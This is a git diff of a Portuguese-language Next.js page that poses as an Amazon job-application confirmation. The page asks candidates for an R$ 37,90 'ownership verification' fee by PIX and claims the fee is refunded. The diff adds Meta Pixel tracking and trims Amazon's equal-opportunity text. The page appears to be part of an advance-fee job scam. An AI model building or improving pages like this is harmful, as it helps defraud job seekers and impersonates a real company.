@@ -3,6 +3,7 @@
 import { useEffect, useState } from "react";
 import Image from "next/image";
 import { useRouter } from "next/navigation";
+import Script from "next/script"; // 👉 importa Script do Next.js
 import "./sucess.css";
 
 interface Vaga {
@@ -24,47 +25,70 @@ export default function Sucesso() {
     }
   }, []);
 
- const handlePayment = async () => {
-  if (!vaga) return;
-  setLoading(true);
+  const handlePayment = async () => {
+    if (!vaga) return;
+    setLoading(true);
 
-  try {
-    const orderId = `${vaga.id}-${Date.now()}`;
-const candidatoInfo = JSON.parse(localStorage.getItem("candidatoInfo") || "{}");
+    try {
+      const orderId = `${vaga.id}-${Date.now()}`;
+      const candidatoInfo = JSON.parse(localStorage.getItem("candidatoInfo") || "{}");
 
-const r = await fetch("/api/checkout", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    amount: 3790, // R$ 37,90 em centavos
-    orderId,
-    description: `Verificação de titularidade para vaga ${vaga.titulo}`,
-    payer: {
-      name: candidatoInfo?.nome || "Cliente Teste",
-      email: candidatoInfo?.email || "sememail@teste.com",
-    },
-  }),
-});
+      const r = await fetch("/api/checkout", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          amount: 3790, // R$ 37,90 em centavos
+          orderId,
+          description: `Verificação de titularidade para vaga ${vaga.titulo}`,
+          payer: {
+            name: candidatoInfo?.nome || "Cliente Teste",
+            email: candidatoInfo?.email || "sememail@teste.com",
+          },
+        }),
+      });
 
-
-    const data = await r.json();
-    if (r.ok) {
-      localStorage.setItem("pixCheckout", JSON.stringify(data));
-      router.push("/payment"); // 👉 só redireciona
-    } else {
-      alert("Erro ao gerar cobrança PIX.");
+      const data = await r.json();
+      if (r.ok) {
+        localStorage.setItem("pixCheckout", JSON.stringify(data));
+        router.push("/payment"); // 👉 redireciona
+      } else {
+        alert("Erro ao gerar cobrança PIX.");
+      }
+    } catch (err) {
+      console.error("⛔ Erro no pagamento:", err);
+      alert("Falha ao conectar com o gateway.");
+    } finally {
+      setLoading(false);
     }
-  } catch (err) {
-    console.error("⛔ Erro no pagamento:", err);
-    alert("Falha ao conectar com o gateway.");
-  } finally {
-    setLoading(false);
-  }
-};
-
+  };
 
   return (
     <main className="candidatura sucesso">
+      {/* Meta Pixel Code */}
+      <Script id="meta-pixel" strategy="afterInteractive">
+        {`
+          !function(f,b,e,v,n,t,s)
+          {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+          n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+          if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+          n.queue=[];t=b.createElement(e);t.async=!0;
+          t.src=v;s=b.getElementsByTagName(e)[0];
+          s.parentNode.insertBefore(t,s)}(window, document,'script',
+          'https://connect.facebook.net/en_US/fbevents.js');
+          fbq('init', '1555441225817856');
+          fbq('track', 'PageView');
+        `}
+      </Script>
+      <noscript>
+        <img
+          height="1"
+          width="1"
+          style={{ display: "none" }}
+          src="https://www.facebook.com/tr?id=1555441225817856&ev=PageView&noscript=1"
+        />
+      </noscript>
+      {/* End Meta Pixel Code */}
+
       <header>
         <div className="navbar">
           {/* LOGO */}
@@ -107,8 +131,7 @@ const r = await fetch("/api/checkout", {
               <b>Salário:</b> {vaga ? vaga.salario : "Carregando..."}
             </li>
             <li>
-              <b>Benefícios:</b> Plano de saúde, vale-refeição e bônus de
-              desempenho
+              <b>Benefícios:</b> Plano de saúde, vale-refeição e bônus de desempenho
             </li>
             <li>
               <b>Modelo de trabalho:</b>{" "}
@@ -126,13 +149,12 @@ const r = await fetch("/api/checkout", {
           <h2>Verificação de Titularidade</h2>
           <p>
             Para protegermos seu cadastro e evitar tentativas de fraude, pedimos
-            uma taxa única de <b>R$ 37,90</b> apenas para confirmar a
-            titularidade do pagamento.
+            uma taxa única de <b>R$ 37,90</b> apenas para confirmar a titularidade
+            do pagamento.
           </p>
           <p>
             É só um procedimento de verificação: após a conferência, o valor é
-            estornado e você recebe o comprovante diretamente no e-mail
-            cadastrado.
+            estornado e você recebe o comprovante diretamente no e-mail cadastrado.
           </p>
 
           <button
@@ -146,25 +168,6 @@ const r = await fetch("/api/checkout", {
       </section>
 
       <footer className="footer">
-        {/* Linha Social */}
-        <div className="footer-social">
-          <h4>Junte-se a nós agora</h4>
-          <a href="#" aria-label="Facebook" className="social-link">
-            <svg
-              width="22"
-              height="22"
-              viewBox="0 0 448 512"
-              fill="currentColor"
-              xmlns="http://www.w3.org/2000/svg"
-            >
-              <path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 
-                  37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 
-                  38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z" />
-            </svg>
-          </a>
-        </div>
-
-        {/* Linha Colunas */}
         <div className="footer-top">
           <div className="footer-col">
             <h4>OPORTUNIDADES DE EMPREGO</h4>
@@ -205,16 +208,11 @@ const r = await fetch("/api/checkout", {
           </div>
         </div>
 
-        {/* Linha inferior */}
         <div className="footer-bottom">
           <p className="descricao">
             A Amazon está comprometida com um ambiente de trabalho diversificado
-            e inclusivo. A Amazon é uma empregadora que oferece oportunidades
-            iguais e não discrimina com base em raça, nacionalidade, sexo,
-            identidade de gênero, orientação sexual, deficiência, idade ou outro
-            status legalmente protegido.
+            e inclusivo.
           </p>
-
           <div className="footer-legal">
             <a href="#">Aviso de privacidade</a>
             <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
